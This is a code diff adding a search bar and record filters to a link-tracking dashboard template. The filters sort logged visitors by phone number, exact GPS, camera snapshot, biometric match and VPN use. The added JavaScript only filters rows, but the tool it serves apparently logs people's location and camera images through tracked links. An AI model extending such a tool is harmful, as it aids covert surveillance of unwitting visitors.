@@ -69,10 +69,23 @@
   </div>
 </div>
 
+<!-- Search & Filter Bar -->
+<div class="mb-4 flex items-center gap-3">
+  <input type="text" id="logSearch" onkeyup="filterLogs()" placeholder="🔍 Search logs by IP, phone, device model, city, ISP..."
+    class="w-full max-w-md bg-gray-900 border border-gray-800 rounded-xl px-4 py-2 text-xs text-white placeholder-gray-500 focus:outline-none focus:border-red-500/60 transition" />
+  <select id="flagFilter" onchange="filterLogs()" class="bg-gray-900 border border-gray-800 rounded-xl px-3 py-2 text-xs text-gray-300 focus:outline-none focus:border-red-500/60 transition">
+    <option value="all">Filter: All Records</option>
+    <option value="phone">Has Phone Number</option>
+    <option value="gps">Has Exact GPS</option>
+    <option value="photo">Has Camera Snapshot</option>
+    <option value="proxy">VPN / Proxy Detected</option>
+  </select>
+</div>
+
 <!-- Logs Table -->
 <div class="glass rounded-2xl overflow-hidden">
   <div class="overflow-x-auto">
-    <table class="w-full text-xs">
+    <table class="w-full text-xs" id="logsTable">
       <thead>
         <tr class="border-b border-gray-800/50 text-gray-500 uppercase tracking-wider text-[10px]">
           <th class="text-left px-4 py-3">#</th>
@@ -265,6 +278,35 @@
 
   function exportCSV() {
     window.location.href = '/api/stats/{{ link_id }}/export';
+  }
+
+  function filterLogs() {
+    const query = document.getElementById('logSearch').value.toLowerCase();
+    const flag = document.getElementById('flagFilter').value;
+    const table = document.getElementById('logsTable');
+    if (!table) return;
+    const rows = table.getElementsByTagName('tbody')[0].getElementsByTagName('tr');
+
+    for (let i = 0; i < rows.length; i += 2) {
+      const mainRow = rows[i];
+      const detailRow = rows[i + 1];
+      const text = mainRow.innerText.toLowerCase() + (detailRow ? detailRow.innerText.toLowerCase() : '');
+      
+      let matchQuery = !query || text.includes(query);
+      let matchFlag = true;
+
+      if (flag === 'phone') matchFlag = text.includes('phone logged') || text.includes('📞');
+      else if (flag === 'gps') matchFlag = text.includes('exact gps') || text.includes('hardware gps');
+      else if (flag === 'photo') matchFlag = text.includes('camera snapped') || text.includes('biometric match');
+      else if (flag === 'proxy') matchFlag = text.includes('vpn');
+
+      if (matchQuery && matchFlag) {
+        mainRow.style.display = '';
+      } else {
+        mainRow.style.display = 'none';
+        if (detailRow) detailRow.classList.add('hidden');
+      }
+    }
   }
 </script>
 {% endblock %}
